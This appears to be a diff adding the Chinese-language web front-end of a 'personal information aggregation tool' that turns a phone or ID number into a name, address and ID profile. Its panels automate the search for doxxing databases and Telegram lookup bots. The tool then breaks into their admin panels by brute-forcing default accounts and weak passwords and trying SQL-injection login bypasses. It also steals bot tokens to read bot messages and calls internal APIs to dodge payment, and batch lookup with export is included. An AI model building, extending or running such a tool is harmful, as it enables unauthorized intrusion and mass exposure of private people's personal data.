@@ -1,0 +1,1385 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>个人信息聚合工具</title>
+  <style>
+    :root { --bg:#0f1115; --panel:#1a1d24; --border:#2a2f3a; --fg:#e6e9ef; --muted:#8b93a7; --accent:#4f8cff; --ok:#36d399; --warn:#fbbd23; }
+    * { box-sizing: border-box; }
+    body { margin:0; font-family: -apple-system, "PingFang SC", "Microsoft YaHei", Segoe UI, sans-serif; background:var(--bg); color:var(--fg); }
+    header { padding:16px 24px; border-bottom:1px solid var(--border); display:flex; align-items:center; gap:12px; }
+    header h1 { font-size:18px; margin:0; }
+    .badge { font-size:12px; color:var(--muted); border:1px solid var(--border); padding:2px 8px; border-radius:10px; }
+    main { padding:24px; max-width:980px; margin:0 auto; }
+    .row { display:flex; gap:10px; }
+    input[type=text] { flex:1; background:var(--panel); border:1px solid var(--border); color:var(--fg); padding:12px 14px; border-radius:10px; font-size:15px; outline:none; }
+    input[type=text]:focus { border-color:var(--accent); }
+    button { background:var(--accent); color:#fff; border:none; padding:12px 22px; border-radius:10px; font-size:15px; cursor:pointer; }
+    button:disabled { opacity:.6; cursor:default; }
+    .hint { color:var(--muted); font-size:13px; margin-top:8px; }
+    .result { margin-top:24px; }
+    .card { background:var(--panel); border:1px solid var(--border); border-radius:12px; padding:16px 18px; margin-bottom:14px; }
+    .card h3 { margin:0 0 10px; font-size:14px; color:var(--accent); display:flex; align-items:center; gap:8px; }
+    .valid { font-size:12px; padding:1px 8px; border-radius:8px; }
+    .valid.ok { background:rgba(54,211,153,.15); color:var(--ok); }
+    .valid.no { background:rgba(251,189,35,.15); color:var(--warn); }
+    table { width:100%; border-collapse:collapse; font-size:14px; }
+    td { padding:7px 10px; border-bottom:1px solid var(--border); }
+    td.k { color:var(--muted); width:140px; }
+    .empty { color:var(--muted); }
+    .kv { display:flex; gap:10px; padding:6px 0; border-bottom:1px solid var(--border); font-size:14px; }
+    .kv .k { color:var(--muted); min-width:120px; }
+    .kv .err { color:var(--warn); }
+    .hit { padding:5px 0 5px 12px; font-size:13px; }
+    .hit a { color:var(--accent); text-decoration:none; word-break:break-all; }
+    .hit a:hover { text-decoration:underline; }
+    .graph { background:var(--panel); border:1px solid var(--border); border-radius:12px; padding:10px; margin-bottom:14px; }
+    .graph svg text { font-family: sans-serif; }
+    .export { margin-top:10px; }
+    .export button { background:#222732; border:1px solid var(--border); font-size:13px; padding:8px 14px; margin-right:8px; }
+    .batch { margin-top:28px; border-top:1px solid var(--border); padding-top:20px; }
+    .tg { margin-top:28px; border-top:1px solid var(--border); padding-top:20px; }
+    .tg h2 { font-size:15px; margin:0 0 10px; }
+    .tg .grid { display:grid; grid-template-columns:repeat(2, minmax(0,1fr)); gap:8px; }
+    .tg input[type=text] { padding:9px 12px; font-size:13px; border-radius:8px; }
+    .tg button { padding:9px 16px; font-size:13px; border-radius:8px; }
+    .tg .ghost { background:#222732; border:1px solid var(--border); }
+    .tg select { background:var(--panel); border:1px solid var(--border); color:var(--fg); padding:8px 10px; border-radius:8px; font-size:13px; }
+    .tg .step { background:var(--panel); border:1px solid var(--border); border-radius:12px; padding:14px 16px; margin-bottom:12px; }
+    .tg .step h4 { margin:0 0 10px; font-size:13px; color:var(--accent); font-weight:600; }
+    .tg .line { display:flex; gap:8px; align-items:center; margin-bottom:8px; flex-wrap:wrap; }
+    .tg .line > label { color:var(--muted); font-size:12px; min-width:70px; }
+    #tgFound table { font-size:13px; }
+    #tgFound th { text-align:left; padding:6px 8px; color:var(--muted); font-weight:500; border-bottom:1px solid var(--border); }
+    #tgFound td { padding:6px 8px; }
+    .kind { font-size:11px; padding:1px 6px; border-radius:6px; border:1px solid var(--border); color:var(--muted); }
+    pre.reply { white-space:pre-wrap; word-break:break-all; background:#13161c; border:1px solid var(--border); border-radius:8px; padding:10px; font-size:12px; max-height:220px; overflow:auto; }
+    .tg .ok { color:var(--ok); font-size:13px; }
+    .tg .bad { color:var(--warn); font-size:13px; }
+    .batch h2 { font-size:15px; margin:0 0 10px; color:var(--fg); }
+    .batch textarea { width:100%; background:var(--panel); border:1px solid var(--border); color:var(--fg); padding:12px 14px; border-radius:10px; font-size:14px; outline:none; resize:vertical; font-family:inherit; }
+    .batch textarea:focus { border-color:var(--accent); }
+    #batchResult table { font-size:13px; }
+    #batchResult th { text-align:left; padding:7px 10px; border-bottom:1px solid var(--border); color:var(--muted); font-weight:500; }
+
+    /* 极简主区 + 高级功能折叠 */
+    .big input[type=text] { font-size:17px; padding:14px 16px; }
+    .big button { font-size:16px; padding:14px 26px; }
+    details.adv { border:1px solid var(--border); border-radius:12px; padding:0 16px; margin-top:20px; }
+    details.adv > summary { cursor:pointer; padding:14px 0; color:var(--muted); font-size:14px; user-select:none; list-style:none; }
+    details.adv > summary::-webkit-details-marker { display:none; }
+    details.adv > summary::before { content:'▸ '; }
+    details.adv[open] > summary::before { content:'▾ '; }
+    details.adv > summary:hover { color:var(--fg); }
+    details.adv[open] > summary { color:var(--fg); border-bottom:1px solid var(--border); margin-bottom:12px; }
+    details.adv .tg, details.adv .batch { margin-top:12px; }
+    .srcline { display:flex; align-items:center; gap:10px; padding:8px 0; border-bottom:1px solid var(--border); font-size:13px; flex-wrap:wrap; }
+    .srcline:last-child { border-bottom:none; }
+    .srcline .nm { font-weight:600; min-width:150px; }
+    .srcline .url { color:var(--muted); font-family:ui-monospace,Menlo,Consolas,monospace; font-size:12px; word-break:break-all; flex:1; }
+    .pill { display:inline-block; padding:2px 9px; border-radius:999px; font-size:11px; border:1px solid var(--border); }
+    .pill.on { color:var(--ok); border-color:var(--ok); }
+    .pill.off { color:var(--muted); }
+    .logbox { max-height:260px; overflow:auto; font-family:ui-monospace,Menlo,Consolas,monospace; font-size:12px; line-height:1.7; }
+    .logbox div { padding:1px 0; }
+    .logbox .hit { color:var(--ok); }
+    .logbox .warn { color:var(--warn); }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>个人信息聚合工具</h1>
+    <span class="badge" id="scannerBadge">加载中…</span>
+  </header>
+  <main>
+    <div class="row big">
+      <input type="text" id="input" placeholder="输入 手机号 / 身份证号" />
+      <button id="run">查</button>
+    </div>
+    <div class="hint">输手机号或身份证号，直接出姓名 / 住址 / 电话 / 身份证号。还没有数据源？点下面「开始自动找源」，应用自己去找。</div>
+
+    <div class="result" id="result"></div>
+
+    <div class="card" style="margin-top:16px">
+      <h3>① 自动找源（不用你提供网址，点一下就行）</h3>
+      <div class="hint">
+        应用自己去搜索引擎找查档站 → 筛出像查档站的 → 逐个自动攻破（找后台、破登录、试出参数名）
+        → 真能出数据的自动接入。你什么都不用填。
+      </div>
+      <div class="line" style="margin-top:10px">
+        <button id="dsStart">开始自动找源</button>
+        <button class="ghost" id="dsStop">停止</button>
+        <label style="min-width:auto">最多深打</label>
+        <input type="text" id="dsMax" value="8" style="max-width:80px" />
+        <span class="hint" id="dsMsg"></span>
+      </div>
+      <div class="logbox" id="dsLog"></div>
+      <div id="dsOut"></div>
+    </div>
+
+    <div class="card">
+      <h3>② 接入一个查档站（你已经知道网址时才用）</h3>
+      <div class="hint">有现成网址就粘进来，自动：找后台 → 破登录 → 找出它的查询接口 → 试出它用哪个参数名 → 存成数据源。</div>
+      <div class="line" style="margin-top:10px">
+        <input type="text" id="qcUrl" placeholder="https://某个查档站.com" />
+        <button class="ghost" id="qcGo">攻破并接入</button>
+      </div>
+      <div class="line">
+        <label style="min-width:auto">Cookie（可选）</label>
+        <input type="text" id="qcCookie" placeholder="已有后台登录 Cookie 就填，留空会自动爆破" style="max-width:320px" />
+        <label style="min-width:auto">探测子域</label>
+        <select id="qcSubs"><option value="0">否（快）</option><option value="1">是</option></select>
+      </div>
+      <div class="hint" id="qcMsg"></div>
+      <div class="logbox" id="qcLog"></div>
+    </div>
+
+    <div class="card">
+      <h3>③ 已接入的数据源</h3>
+      <div id="qcTargets"><div class="hint">加载中…</div></div>
+      <div class="line" style="margin-top:10px">
+        <input type="text" id="qcTestInput" placeholder="用手机号/身份证试查一次" style="max-width:280px" />
+        <button class="ghost" id="qcTest">试查</button>
+        <span class="hint" id="qcTestMsg"></span>
+      </div>
+      <div id="qcTestOut"></div>
+    </div>
+
+    <div class="card">
+      <h3>网络自检（打不开站先看这里）</h3>
+      <div class="line">
+        <button class="ghost" id="netDetect">自动检测系统代理</button>
+        <button class="ghost" id="netCheck">测试连通性</button>
+        <span class="hint" id="netMsg">当前代理：<span id="netNow">读取中…</span></span>
+      </div>
+      <div id="netOut"></div>
+    </div>
+
+    <details class="adv">
+      <summary>高级功能（Telegram 找源 / 手动攻破 / 批量 / 一键接管 —— 日常不用打开）</summary>
+
+    <div class="tg">
+      <h2>Telegram 接入 · 找源（非公开社工库机器人 / 查档群）</h2>
+      <div class="hint" id="tgStatus">状态检测中…</div>
+
+      <div class="step">
+        <h4>① API 凭据（可一键从 my.telegram.org 获取）</h4>
+        <div class="line">
+          <label>代理</label>
+          <input type="text" id="proxyCfg" placeholder="http://127.0.0.1:7890 或 socks5://127.0.0.1:7890（国内必填）" />
+          <button id="proxySave" class="ghost">保存代理</button>
+          <button id="proxyTest" class="ghost">测试连通性</button>
+          <span class="hint" id="proxyMsg"></span>
+        </div>
+        <div class="line">
+          <label>手机号</label>
+          <input type="text" id="myPhone" placeholder="+8613800138000" />
+          <button id="mySend">发送登录码</button>
+        </div>
+        <div class="line">
+          <label>登录码</label>
+          <input type="text" id="myCode" placeholder="Telegram 发来的登录码" />
+          <button id="myVerify">自动申请并回填</button>
+        </div>
+        <div class="hint" id="myMsg"></div>
+        <div class="grid" style="margin-top:8px">
+          <input type="text" id="tgApiId" placeholder="apiId（纯数字）" />
+          <input type="text" id="tgApiHash" placeholder="apiHash" />
+        </div>
+        <div class="line" style="margin-top:8px">
+          <button id="tgSaveApi" class="ghost">保存凭据</button>
+          <span class="hint" id="tgApiMsg"></span>
+        </div>
+      </div>
+
+      <div class="step">
+        <h4>② 账号登录（拿到 sessionString，之后查询都用它）</h4>
+        <div class="line">
+          <label>MTProxy</label>
+          <input type="text" id="tgMtIp" placeholder="IP" style="max-width:130px" />
+          <input type="text" id="tgMtPort" placeholder="端口" style="max-width:90px" />
+          <input type="text" id="tgMtSecret" placeholder="secret（32 位 hex，可空）" />
+          <button id="tgMtSave" class="ghost">保存代理</button>
+        </div>
+        <div class="hint" style="margin-bottom:8px">连不上 Telegram 时填 MTProxy。GramJS 只认 MTProxy；SOCKS5/HTTP 代理请开系统级 TUN/VPN 模式。</div>
+        <div class="line">
+          <label>手机号</label>
+          <input type="text" id="tgPhone" placeholder="+8613800138000" />
+          <button id="tgSendCode">发送验证码</button>
+        </div>
+        <div class="line">
+          <label>验证码</label>
+          <input type="text" id="tgCode" placeholder="Telegram 发来的 5 位验证码" />
+          <label style="min-width:auto">云密码</label>
+          <input type="text" id="tgPwd" placeholder="开了两步验证才填" />
+          <button id="tgSignIn">完成登录</button>
+        </div>
+        <div class="hint" id="tgLoginMsg"></div>
+      </div>
+
+      <div class="step">
+        <h4>③ 找源：按关键词搜机器人 / 群组 / 频道</h4>
+        <div class="line">
+          <input type="text" id="tgKeyword" placeholder="关键词，如：社工库 / 查档 / 户籍 / 快递" />
+          <button id="tgSearch">搜索</button>
+          <button id="tgDialogs" class="ghost">我已加入的会话</button>
+        </div>
+        <div id="tgFound"></div>
+      </div>
+
+      <div class="step">
+        <h4>④ 试查：确认机器人返回格式（据此定正则）</h4>
+        <div class="line">
+          <label>目标</label>
+          <input type="text" id="tgTarget" placeholder="@机器人用户名" />
+          <label style="min-width:auto">内容</label>
+          <input type="text" id="tgText" placeholder="要查的手机号 / 身份证号" />
+          <button id="tgProbe">发送并取回回复</button>
+        </div>
+        <div id="tgProbeOut"></div>
+      </div>
+    </div>
+
+    <div class="tg">
+      <h2>一键接管（Telegram 找源 → 抠官网 → 侦察 → 破登录 → 接管机器人 → 导成数据源）</h2>
+      <div class="hint">
+        全自动跑完上面所有步骤，不用手动粘域名。前提：先在上面的「Telegram 接入 · 找源」完成账号登录。
+        任务在后台运行，点开始后可实时看进度。
+      </div>
+
+      <div class="step">
+        <h4>① 找源（Telegram 全站搜）</h4>
+        <div class="line">
+          <label>关键词</label>
+          <input type="text" id="apKw" value="户籍查询,查档,社工库,快递地址,身份查询" />
+        </div>
+        <div class="line">
+          <label style="min-width:auto">每个关键词取</label>
+          <input type="text" id="apLimit" value="20" style="max-width:90px" />
+          <label style="min-width:auto">最多试聊</label>
+          <input type="text" id="apMaxProbe" value="0" style="max-width:90px" />
+          <label style="min-width:auto">发什么</label>
+          <input type="text" id="apProbeText" placeholder="留空=不主动发消息；填 /start 或 官网 会发给机器人套话" />
+        </div>
+      </div>
+
+      <div class="step">
+        <h4>② 站点（可选，跳过找源直接打）</h4>
+        <div class="line">
+          <input type="text" id="apSites" placeholder="已知官网，多个用逗号分隔；留空则只用 Telegram 抠出来的" />
+        </div>
+        <div class="line">
+          <label>爆破账号</label>
+          <input type="text" id="apUsers" value="admin,administrator,root,sgk" style="max-width:320px" />
+          <label style="min-width:auto">爆破口令</label>
+          <input type="text" id="apPasswords" placeholder="留空=用内置 51 条弱口令" />
+        </div>
+        <div class="line">
+          <label style="min-width:auto">最多侦察</label>
+          <input type="text" id="apMaxSites" value="6" style="max-width:80px" />
+          <label style="min-width:auto">最多破登录</label>
+          <input type="text" id="apMaxBreach" value="3" style="max-width:80px" />
+          <label style="min-width:auto">探测子域</label>
+          <select id="apSubs"><option value="1">是</option><option value="0">否</option></select>
+          <label style="min-width:auto">跑完自动导入</label>
+          <select id="apImport"><option value="1">是</option><option value="0">否</option></select>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="line">
+          <button id="apStart">开始一键接管</button>
+          <button id="apStop" class="ghost">停止</button>
+          <span class="hint" id="apMsg"></span>
+        </div>
+        <div id="apOut"></div>
+      </div>
+    </div>
+
+    <div class="tg">
+      <h2>后台突破（打社工库/查档服务后台 → 接管其机器人 / 直调查询接口）</h2>
+      <div class="hint">流程：找后台入口 → 破登录 → 抠 Bot Token 或内部查询接口 → 直调。所有请求复用上面的代理。</div>
+
+      <div class="step">
+        <h4>① 侦察：找后台入口 / 泄露面 / 子域</h4>
+        <div class="line">
+          <input type="text" id="ofUrl" placeholder="目标，如 https://chaxun.example.com 或 https://t.me/xxx（会自动落地到官网）" />
+          <button id="ofRecon">侦察</button>
+        </div>
+        <div id="ofReconOut"></div>
+      </div>
+
+      <div class="step">
+        <h4>② 破登录：弱口令 / 万能口令</h4>
+        <div class="line">
+          <label>登录地址</label>
+          <input type="text" id="ofLoginUrl" placeholder="https://chaxun.example.com/admin.php" />
+        </div>
+        <div class="line">
+          <label>用户名</label>
+          <input type="text" id="ofUsers" value="admin,administrator,root,sgk" style="max-width:320px" />
+          <label style="min-width:auto">Cookie</label>
+          <input type="text" id="ofCookie" placeholder="已有会话 Cookie（可空）" />
+        </div>
+        <textarea id="ofPasswords" rows="3" placeholder="密码字典，每行一个；留空用内置弱口令库（60+）"></textarea>
+        <div class="line" style="margin-top:8px">
+          <button id="ofBrute">弱口令爆破</button>
+          <button id="ofSqli" class="ghost">万能口令/SQL 注入</button>
+          <span class="hint" id="ofBruteMsg"></span>
+        </div>
+        <div id="ofBruteOut"></div>
+      </div>
+
+      <div class="step">
+        <h4>③ 接管机器人：Bot Token</h4>
+        <div class="line">
+          <label>Token</label>
+          <input type="text" id="ofToken" placeholder="7123456789:AAF...（从 .env / 后台配置 / 源码里抠）" />
+          <button id="ofTokenFrom" class="ghost">从页面抠</button>
+          <button id="ofGetMe">getMe 验证</button>
+          <button id="ofUpdates" class="ghost">getUpdates（读它的消息）</button>
+        </div>
+        <div id="ofBotOut"></div>
+      </div>
+
+      <div class="step">
+        <h4>④ 直调接口（拿到就绕过积分/付费）</h4>
+        <div class="line">
+          <label>方法</label>
+          <select id="ofMethod">
+            <option value="POST">POST</option>
+            <option value="GET">GET</option>
+          </select>
+          <input type="text" id="ofApi" placeholder="https://chaxun.example.com/api/query" />
+        </div>
+        <div class="line">
+          <label>Headers</label>
+          <input type="text" id="ofHeaders" placeholder='Cookie: admin_auth=xxx; token: abc（多组用分号分隔）' />
+        </div>
+        <div class="line">
+          <label>Body</label>
+          <input type="text" id="ofBody" placeholder="keyword=13800138000&type=phone（GET 时留空）" />
+          <button id="ofCall">发送</button>
+          <button id="ofLoot" class="ghost">登录后自动扫接口</button>
+        </div>
+        <div id="ofCallOut"></div>
+      </div>
+    </div>
+
+    <div class="batch">
+      <h2>批量解析与抓取</h2>
+      <textarea id="batchInput" rows="5" placeholder="每行一条：手机号 或 身份证号（也支持 手机号,身份证 逗号分隔，取第一列）"></textarea>
+      <div class="row" style="margin-top:10px">
+        <button id="batchRun">批量解析与抓取</button>
+      </div>
+      <div class="hint">对每行执行手机号归属地解析、身份证解析，以及已配置的非公开数据源抓取（登录态自动注入）。</div>
+      <div class="result" id="batchResult"></div>
+    </div>
+
+    </details>
+  </main>
+
+  <script>
+    const $input = document.getElementById('input');
+    const $run = document.getElementById('run');
+    const $result = document.getElementById('result');
+    const $badge = document.getElementById('scannerBadge');
+
+    async function loadHealth() {
+      try {
+        const r = await fetch('/api/health');
+        const j = await r.json();
+        $badge.textContent = '已加载数据源: ' + (j.scanners || []).join(', ');
+      } catch (e) { $badge.textContent = '后端未连接'; }
+    }
+    loadHealth();
+
+    function escapeHtml(s) {
+      return String(s).replace(/[&<>"']/g, c => ({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;' }[c]));
+    }
+    function shorten(s, n) {
+      s = String(s == null ? '' : s);
+      return s.length > (n || 10) ? s.slice(0, n) + '…' : s;
+    }
+
+    function kvTable(obj) {
+      let rows = '';
+      for (const [k, v] of Object.entries(obj)) {
+        rows += `<tr><td class="k">${escapeHtml(k)}</td><td>${v === null || v === undefined ? '' : escapeHtml(v)}</td></tr>`;
+      }
+      return `<table>${rows}</table>`;
+    }
+
+    function renderOnline(data) {
+      let html = '';
+      const q = data.phone || data.query || '';
+      html += `<div class="kv"><span class="k">查询内容</span><span>${escapeHtml(q)}</span></div>`;
+      const engines = data.engineResults || {};
+      for (const [eng, r] of Object.entries(engines)) {
+        if (r.error) { html += `<div class="kv"><span class="k">${eng}</span><span class="err">${escapeHtml(r.error)}</span></div>`; continue; }
+        html += `<div class="kv"><span class="k">${eng} 命中</span><span>${r.count}</span></div>`;
+        (r.hits || []).forEach((h) => {
+          const title = (h.title || h.url || '').replace(/[<>]/g, '');
+          html += `<div class="hit"><a href="${escapeHtml(h.url)}" target="_blank" rel="noopener">${escapeHtml(title)}</a></div>`;
+        });
+      }
+      return html;
+    }
+
+    function renderCustom(data) {
+      let html = '';
+      for (const [name, r] of Object.entries(data || {})) {
+        html += `<div class="kv"><span class="k">${escapeHtml(name)}</span><span>HTTP ${r.status}</span></div>`;
+        const fields = r.fields || {};
+        let rows = '';
+        for (const [k, v] of Object.entries(fields)) {
+          rows += `<tr><td class="k">${escapeHtml(k)}</td><td>${v === null || v === undefined ? '' : escapeHtml(v)}</td></tr>`;
+        }
+        if (rows) html += `<table>${rows}</table>`;
+      }
+      return html;
+    }
+
+    function renderStandardCard(std) {
+      if (!std) return '';
+      const rows = [
+        ['姓名', std.name],
+        ['户籍 / 生活住址', std.address],
+        ['电话号', std.phone],
+        ['身份证号', std.idcard],
+      ];
+      let t = '';
+      rows.forEach(([k, v]) => {
+        const val = (v === null || v === undefined || v === '')
+          ? '<span class="empty">未获取到（需配置非公开数据源）</span>'
+          : escapeHtml(v);
+        t += `<tr><td class="k">${k}</td><td>${val}</td></tr>`;
+      });
+      return `<div class="card"><h3>个人档案</h3><table>${t}</table></div>`;
+    }
+
+    function renderGraph(profile, input) {
+      if (!profile) return '';
+      const keys = Object.keys(profile).filter(k => typeof profile[k] === 'string' || typeof profile[k] === 'number');
+      if (keys.length === 0) return '';
+      const cx = 250, cy = 150, r = 120;
+      let svg = '';
+      svg += `<circle cx="${cx}" cy="${cy}" r="36" fill="#4f8cff"/><text x="${cx}" y="${cy+5}" text-anchor="middle" fill="#fff" font-size="11">${escapeHtml(shorten(input, 12))}</text>`;
+      const n = keys.length;
+      keys.forEach((k, i) => {
+        const ang = (Math.PI * 2 * i / n) - Math.PI / 2;
+        const x = cx + r * Math.cos(ang), y = cy + r * Math.sin(ang);
+        svg += `<line x1="${cx}" y1="${cy}" x2="${x}" y2="${y}" stroke="#2a2f3a"/>`;
+        svg += `<circle cx="${x}" cy="${y}" r="30" fill="#1a1d24" stroke="#2a2f3a"/>`;
+        svg += `<text x="${x}" y="${y-4}" text-anchor="middle" fill="#8b93a7" font-size="9">${escapeHtml(k)}</text>`;
+        svg += `<text x="${x}" y="${y+9}" text-anchor="middle" fill="#e6e9ef" font-size="9">${escapeHtml(shorten(profile[k], 8))}</text>`;
+      });
+      return `<div class="graph"><svg viewBox="0 0 500 300" width="100%" height="220">${svg}</svg></div>`;
+    }
+
+    let lastJson = null;
+
+    $run.addEventListener('click', async () => {
+      const input = $input.value.trim();
+      if (!input) return;
+      $run.disabled = true; $run.textContent = '聚合中…';
+      $result.innerHTML = '<div class="card">处理中…</div>';
+      try {
+        const r = await fetch('/api/scan', {
+          method: 'POST', headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ input }),
+        });
+        const j = await r.json();
+        if (!r.ok) { $result.innerHTML = `<div class="card">错误：${escapeHtml(j.error || '未知')}</div>`; return; }
+        lastJson = j;
+
+        let html = renderStandardCard(j.standard);
+        html += renderGraph(j.profile, j.input);
+        if (j.count === 0) {
+          html += '<div class="card empty">未匹配到任何本地数据源。在线源将在联网时检索公开足迹。</div>';
+        }
+        j.results.forEach((item) => {
+          const validCls = item.valid === true ? 'ok' : (item.valid === false ? 'no' : '');
+          const validTxt = item.valid === true ? '校验通过' : (item.valid === false ? '校验失败' : '');
+          html += `<div class="card"><h3>${escapeHtml(item.source)}${validTxt ? `<span class="valid ${validCls}">${validTxt}</span>` : ''}</h3>`;
+          if (item.error) html += `<div class="empty">错误：${escapeHtml(item.error)}</div>`;
+          else if (item.data) {
+            if (item.source.startsWith('online-')) html += renderOnline(item.data);
+            else if (item.source === 'custom-auth') html += renderCustom(item.data);
+            else html += kvTable(item.data);
+          }
+          html += '</div>';
+        });
+
+        html += `<div class="export"><button id="expJson">导出 JSON</button><button id="expCsv">导出 CSV</button></div>`;
+        $result.innerHTML = html;
+
+        document.getElementById('expJson').onclick = () => download(JSON.stringify(j, null, 2), 'profile.json', 'application/json');
+        document.getElementById('expCsv').onclick = () => download(toCsv(j), 'profile.csv', 'text/csv');
+      } catch (e) {
+        $result.innerHTML = `<div class="card">请求失败：${escapeHtml(e.message)}</div>`;
+      } finally {
+        $run.disabled = false; $run.textContent = '开始聚合';
+      }
+    });
+
+    function toCsv(j) {
+      const rows = [['source', 'key', 'value']];
+      (j.results || []).forEach(r => {
+        const d = r.data || {};
+        Object.entries(d).forEach(([k, v]) => {
+          if (typeof v === 'object') return;
+          rows.push([r.source, k, v]);
+        });
+      });
+      return rows.map(row => row.map(c => `"${String(c).replace(/"/g, '""')}"`).join(',')).join('\n');
+    }
+    function download(content, name, type) {
+      const blob = new Blob([content], { type });
+      const a = document.createElement('a');
+      a.href = URL.createObjectURL(blob);
+      a.download = name; a.click();
+      URL.revokeObjectURL(a.href);
+    }
+
+    $input.addEventListener('keydown', (e) => { if (e.key === 'Enter') $run.click(); });
+
+    function toBatchCsv(j) {
+      const rows = [['输入', '姓名', '住址', '省', '市', '运营商', '出生', '性别']];
+      (j.results || []).forEach((r) => {
+        const p = r.profile || {};
+        const s = r.standard || {};
+        rows.push([r.input, s.name || '', s.address || '', p.province || '', p.city || '', p.operator || '', p.birth || '', p.gender || '']);
+      });
+      return rows.map((row) => row.map((c) => `"${String(c).replace(/"/g, '""')}"`).join(',')).join('\n');
+    }
+
+    async function runBatch() {
+      const lines = document.getElementById('batchInput').value
+        .split(/\r?\n/).map((s) => s.trim()).filter(Boolean)
+        .map((s) => s.split(',')[0].trim()).filter(Boolean);
+      if (!lines.length) return;
+      const btn = document.getElementById('batchRun');
+      btn.disabled = true;
+      document.getElementById('batchResult').innerHTML = '<div class="card">处理中…（' + lines.length + ' 条）</div>';
+      try {
+        const res = await fetch('/api/batch', {
+          method: 'POST', headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ items: lines }),
+        });
+        const j = await res.json();
+        let rows = '';
+        (j.results || []).forEach((r) => {
+          const p = r.profile || {};
+          const s = r.standard || {};
+          rows += `<tr><td>${escapeHtml(r.input)}</td><td>${escapeHtml(s.name || '')}</td><td>${escapeHtml(s.address || '')}</td><td>${escapeHtml(p.province || '')}</td><td>${escapeHtml(p.city || '')}</td><td>${escapeHtml(p.operator || '')}</td><td>${escapeHtml(p.birth || '')}</td><td>${escapeHtml(p.gender || '')}</td></tr>`;
+        });
+        const html = `<div class="card"><h3>批量结果（${(j.results || []).length} 条）</h3><table><tr><th>输入</th><th>姓名</th><th>住址</th><th>省</th><th>市</th><th>运营商</th><th>出生</th><th>性别</th></tr>${rows}</table>`
+          + `<div class="export"><button id="batchExport">导出 CSV</button></div></div>`;
+        document.getElementById('batchResult').innerHTML = html;
+        document.getElementById('batchExport').onclick = () => download(toBatchCsv(j), 'batch.csv', 'text/csv');
+      } catch (e) {
+        document.getElementById('batchResult').innerHTML = `<div class="card">失败：${escapeHtml(e.message)}</div>`;
+      } finally {
+        btn.disabled = false;
+      }
+    }
+    document.getElementById('batchRun').onclick = () => runBatch();
+
+    // ---------- Telegram 面板 ----------
+    const $ = (id) => document.getElementById(id);
+
+    async function tgApi(path, body) {
+      const opt = { method: body ? 'POST' : 'GET', headers: { 'Content-Type': 'application/json' } };
+      if (body) opt.body = JSON.stringify(body);
+      const r = await fetch(path, opt);
+      const j = await r.json();
+      if (!r.ok) throw new Error(j.error || ('HTTP ' + r.status));
+      return j;
+    }
+
+    const DEFAULT_PARSE = {
+      name:   { regex: '姓名[:：]\\s*([^\\s\\n]+)' },
+      address:{ regex: '(?:住址|户籍地址?|收货地址|快递地址|地址)[:：]\\s*([^\\n]+)' },
+      phone:  { regex: '(?:手机|电话)[:：]\\s*([0-9]{7,15})' },
+      idcard: { regex: '(?:身份证号?|证件号)[:：]\\s*([0-9Xx]{15,18})' },
+    };
+
+    function extractBy(regexSrc, text) {
+      try {
+        const m = String(text || '').match(new RegExp(regexSrc));
+        return m ? (m[1] !== undefined ? m[1] : m[0]) : null;
+      } catch (e) { return null; }
+    }
+
+    async function loadTgStatus() {
+      try {
+        const s = await tgApi('/api/tg/status');
+        const parts = [];
+        parts.push(s.available ? 'GramJS 已就绪' : '<span class="bad">GramJS 未安装</span>');
+        parts.push(s.hasApi ? 'API 凭据已填' : '<span class="bad">未填 API 凭据</span>');
+        parts.push(s.hasSession ? '<span class="ok">已登录</span>' : '<span class="bad">未登录</span>');
+        const on = (s.bots || []).filter(b => b.enabled).length;
+        parts.push('已启用机器人 ' + on + ' / ' + (s.bots || []).length);
+        $('tgStatus').innerHTML = parts.join(' · ');
+        return s;
+      } catch (e) {
+        $('tgStatus').innerHTML = '<span class="bad">状态获取失败：' + escapeHtml(e.message) + '</span>';
+      }
+    }
+
+    async function fillApiFields() {
+      try {
+        const j = await tgApi('/api/config');
+        const t = (j.config && j.config.telegram) || {};
+        if (!$('tgApiId').value) $('tgApiId').value = t.apiId || '';
+        if (!$('tgApiHash').value) $('tgApiHash').value = t.apiHash || '';
+        if (!$('proxyCfg').value) $('proxyCfg').value = (j.config && j.config.proxy) || '';
+        const mp = (t.mtproxy) || {};
+        if (!$('tgMtIp').value) $('tgMtIp').value = mp.ip || '';
+        if (!$('tgMtPort').value) $('tgMtPort').value = mp.port || '';
+        if (!$('tgMtSecret').value) $('tgMtSecret').value = mp.secret || '';
+      } catch (e) { /* ignore */ }
+    }
+
+    $('proxySave').onclick = async () => {
+      try {
+        await tgApi('/api/config', { proxy: $('proxyCfg').value.trim() });
+        $('proxyMsg').innerHTML = '<span class="ok">已保存</span>';
+      } catch (e) { $('proxyMsg').innerHTML = '<span class="bad">' + escapeHtml(e.message) + '</span>'; }
+    };
+
+    $('proxyTest').onclick = async () => {
+      const btn = $('proxyTest'); btn.disabled = true; btn.textContent = '测试中…';
+      $('proxyMsg').innerHTML = '<span class="hint">正在连接 my.telegram.org…</span>';
+      try {
+        await tgApi('/api/config', { proxy: $('proxyCfg').value.trim() });
+        const r = await tgApi('/api/my/probe');
+        $('proxyMsg').innerHTML = r.ok
+          ? '<span class="ok">连通（HTTP ' + r.status + '，' + r.latencyMs + 'ms，代理 ' + escapeHtml(r.proxy) + '）</span>'
+          : '<span class="bad">不通：' + escapeHtml(r.error || r.hint) + '（代理 ' + escapeHtml(r.proxy) + '）</span>';
+      } catch (e) {
+        $('proxyMsg').innerHTML = '<span class="bad">' + escapeHtml(e.message) + '</span>';
+      } finally { btn.disabled = false; btn.textContent = '测试连通性'; }
+    };
+
+    $('tgMtSave').onclick = async () => {
+      try {
+        await tgApi('/api/config', {
+          telegram: {
+            mtproxy: {
+              ip: $('tgMtIp').value.trim(),
+              port: $('tgMtPort').value.trim(),
+              secret: $('tgMtSecret').value.trim(),
+            },
+          },
+        });
+        $('tgLoginMsg').innerHTML = '<span class="ok">MTProxy 已保存（下次连接生效）</span>';
+      } catch (e) { $('tgLoginMsg').innerHTML = '<span class="bad">' + escapeHtml(e.message) + '</span>'; }
+    };
+
+    // 一键从 my.telegram.org 申请 apiId / apiHash
+    $('mySend').onclick = async () => {
+      const btn = $('mySend'); btn.disabled = true; btn.textContent = '发送中…';
+      try {
